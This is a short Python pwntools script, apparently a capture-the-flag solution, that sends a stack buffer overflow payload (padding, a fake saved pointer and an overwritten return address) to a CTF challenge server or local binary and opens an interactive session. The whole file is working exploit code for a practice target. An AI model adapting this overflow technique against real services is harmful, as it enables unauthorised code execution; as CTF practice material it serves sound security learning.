#!/usr/bin/env python3

from pwn import *
from binascii import hexlify


####################
# Challenge Server #
####################

SERVER = "challs1.welcomectf.tk"
PORT = 5002


def exploit():
    # Payload start...
    content = b'A' * 32  # Padding
    pointer = b'B' * 8
    returnAddr = p64(0x4014dc + 5)

    payload = content + pointer + returnAddr

    p.sendline(payload)
    p.interactive()


def start_exploit(binary):
    """
    Connect to the server or binary and call the exploit.
    If given a local binary to exploit, run the exploit locally.
    Otherwise, connect to a remote server.
    """
    global p
    p = process(binary) if binary else remote(SERVER, PORT)

    exploit()

# start_exploit('./hexdumpbof.o')
start_exploit(False)
